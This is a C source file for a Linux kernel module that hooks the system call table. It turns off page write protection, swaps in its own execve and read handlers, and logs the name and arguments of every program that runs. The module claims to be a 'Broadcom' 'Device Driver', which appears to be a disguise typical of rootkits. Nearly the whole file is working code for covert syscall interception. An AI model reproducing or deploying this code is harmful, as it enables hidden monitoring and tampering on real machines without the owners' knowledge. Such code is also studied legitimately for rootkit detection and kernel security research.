#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


#include <linux/binfmts.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Broadcom");
MODULE_DESCRIPTION("Device Driver");
MODULE_VERSION("1.0");



unsigned long **SYS_CALL_TABLE;



//Adaptation for 5.0.3.42 and lower (CR4 pinning and CR0 bypass)
void EnablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void DisablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;
}

char char_buffer[255] = {0};
// Note: Do not name variables similar, especially globals.
// The argc <-> argz <-> argv differ only in one char.
// and 2d array to hold arguments strings
char argz[255][255] = {0};
// the count of arguments
size_t argc = 0;

char CharBuffer [255] = {'\0'};
char Argz       [255] = {'\0'};;


unsigned int RealCount = 0;

/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */

asmlinkage int (*origional_execve)(const char *filename, char *const argv[], char *const envp[]);
asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[]) {

    copy_from_user(&CharBuffer , filename , strnlen_user(filename , sizeof(CharBuffer) - 1  ) );
    printk( KERN_INFO "Executable Name %s  \n", CharBuffer );

	char * ptr = 0xF00D; 

    // Since we don't know the count of args we go until the 0 arg.
    // We will collect 20 args maximum. 
    // 

	for (int i = 0 ; i < 20 ; i++){ 
        if(ptr){
	
            int success =  copy_from_user(&ptr, &argv[i], sizeof(ptr));
            // Check for ptr being 0x00 
            if(success == 0 && ptr){
			    RealCount ++;
			
                strncpy_from_user(Argz, ptr , sizeof(Argz)); //copy strings from pointers
                printk( KERN_INFO "Args  %s  \n", Argz );
                memset(Argz, 0 ,sizeof(Argz));
            }
        }
    }
	
    printk("RealCount %d\n", RealCount);
	RealCount = 0;
	argc = RealCount + 1; //since real count stops at zero we add one to adjust argsc

    return (*origional_execve)(filename, argv, envp);
}



asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) {
    
    return (*original_read)(fd, buf, count);
}


static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);


	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
	
	//point to unmodified read
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead;
    
    //point to unmodified execve
	origional_execve = (void*)SYS_CALL_TABLE[__NR_execve];
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)HookExecve;
	
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);

	return 0;
}


static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
	SYS_CALL_TABLE[__NR_read]   = (unsigned long*)original_read;
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)origional_execve;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);

	printk(KERN_INFO "Clean hooks");
}

module_init(SetHooks);
module_exit(HookCleanup);